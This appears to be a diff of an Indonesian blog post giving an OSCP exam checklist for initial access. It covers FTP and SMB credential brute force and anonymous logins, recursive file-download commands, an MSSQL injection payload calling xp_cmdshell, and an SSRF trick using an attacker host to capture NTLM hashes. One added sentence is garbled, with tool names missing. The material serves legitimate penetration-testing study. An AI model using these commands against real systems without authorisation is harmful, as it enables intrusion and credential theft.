@@ -12,19 +12,15 @@ image:
 Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "enumeration game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidak terlalu sulit.
 
 Secara garis besar, maka hal apa saja yang perlu kalian ingat:
-- [FTP (21/tcp)](#ftp-21tcp)
-- [SMB (445/tcp)](#smb-445tcp)
-- [SNMP (161/udp)](#snmp-161udp)
-- [[Uncommon Services] Found Weird Port?](#found-weird-port-uncommon-services)
-- [Web Application (HTTP)](#web-application-http)
-- [Web Application: SSRF to Steal NTLM](#web-application-ssrf-to-steal-ntlm)
-- [Web Application: MSSQL Injection to RCE](#web-application-mssql-injection-to-rce)
-- [Found Numerous Unnecessary Files?](#found-numerous-unnecessary-files)
-- [Found Protected File? Crack It!](#found-protected-file-crack-it)
-- [Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials](#some-files-pdf-docx-zip-db-etc-might-contain-credentials)
-- [Credential Spraying - FTP, RDP, SMB, SSH, and WinRM](#credential-spraying---ftp-rdp-smb-ssh-and-winrm)
-
-## 1. Port Scan
+- [X] [**FTP (21/tcp): Anonymous Login**](#ftp-anonymous-login)
+- [X] [**FTP (21/tcp): Brute Force Login with ftp-betterdefaultpasslist.txt**](#ftp-brute-force-login-with-ftp-betterdefaultpasslisttxt)
+- [X] **SNMP (161/udp): Public Community Strings**
+- [X] **SNMP (161/udp): Brute Force Community Strings**
+- [X] **SMB (445/tcp): Null Session Login**
+- [X] **SMB (445/tcp): Guest Login**
+- [X] **Web Application (HTTP): Hidden Directories and Files Enumeration**
+- [X] **Web Application (HTTP): SQL Injection (MSSQL to Command Execution)**
+- [X] **Web Application (HTTP): Server-Side Request Forgery in Windows Server (Obtain NTLM)**
 
 Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya tidak akan menggunakan NMAP karena waktu yang tersedia saat ujian OSCP sangat terbatas.
 
@@ -34,41 +30,47 @@ Saat melakukan pengujian dengan beberapa tools, pilihan saya jatuh pada tools be
 
 TCP:
 ```bash
-rustscan --scripts none -a <TARGET>
+rustscan --scripts none -a $TARGET
 ```
 
 UDP:
 ```bash
-udpx -c 500 -w 1000 -t <TARGET>
+udpx -c 500 -w 1000 -t $TARGET
 ```
 
-## 2. FTP (21/tcp)
+## FTP Anonymous Login
 
-Initial Access pada FTP umumnya dapat dilakukan melalui dua cara, yaitu `FTP Anonymous Login` dan `FTP Default Credential Brute Force`.
+Tool yang akan saya gunakan di sini adalah [NetExec](https://github.com/Pennyw0rth/NetExec).
 
-### FTP Anonymous Login
-
-- [NetExec](https://github.com/Pennyw0rth/NetExec)
+Skenario yang dapat kita lakukan saat mendapatkan akses FTP Anonymous Login:
+- Read-only: Penyerang dapat mengunduh file sensitif, seperti konfigurasi (.env, .conf), file backup (.sql, .zip), atau kredensial (.db, .pdf, .txt).
+- Write access: Kita dapat mengunggah file backdoor, untuk mendapatkan akses reverse shell.
 
 ```bash
-netexec ftp <TARGET> -u 'anonymous' -p 'anonymous'
+netexec ftp $TARGET -u 'anonymous' -p 'anonymous'
 ```
 
-### FTP Default Credential Brute Force
+## FTP Brute Force Login with ftp-betterdefaultpasslist.txt
 
-Untuk menemukan Default Credential kita dapat memanfaatkan Tool [Hydra](https://www.kali.org/tools/hydra/) dan Wordlist dari [SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt).
+Kemudian, yang keuda, pada service FTP kita dapat memanfaatkan Tool  dan Wordlist dari  untuk menemukan Credential yang valid.
+
+Selain itu, pada service FTP, kita dapat memanfaatkan tool [Hydra](https://www.kali.org/tools/hydra/) dan wordlist dari [ftp-betterdefaultpasslist.txt (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt) untuk menemukan kredensial yang valid.
 
 ```bash
-hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp
+hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $TARGET ftp
 ```
 
-### Other FTP Cheatsheet
 
-Download file recursively.
 
-```bash
-wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
-```
+
+
+
+
+
+
+
+
+
 
 ## 3. SMB (445/tcp)
 
@@ -104,14 +106,6 @@ enum4linux -u <USERNAME> -p <PASSWORD> -a -v <TARGET>
 ```
 
 ![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)
-
-### Other SMB Cheatsheet
-
-Download semua file di dalam SMB secara recursive.
-
-```bash
-nxc smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
-```
 
 ## 4. SNMP (161/udp)
 
@@ -203,7 +197,7 @@ Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test
 
 Lalu, coba crack NTML-nya.
 
-## 8. Web Application: MSSQL Injection to RCE
+## 8. Web Application: SQL Injection
 
 Karena SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, kita dapat melakukan escape dan menjalankan query lain. Contohnya seperti ini:
 - `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`
@@ -266,3 +260,17 @@ Kita dapat mengubah "winrm" dengan:
 - `smb`
 - `rdp`
 - `ssh`
+
+## Other Cheatsheet
+
+Download file recursively.
+
+```bash
+wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
+```
+
+Download semua file di dalam SMB secara recursive.
+
+```bash
+nxc smb <TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
+```
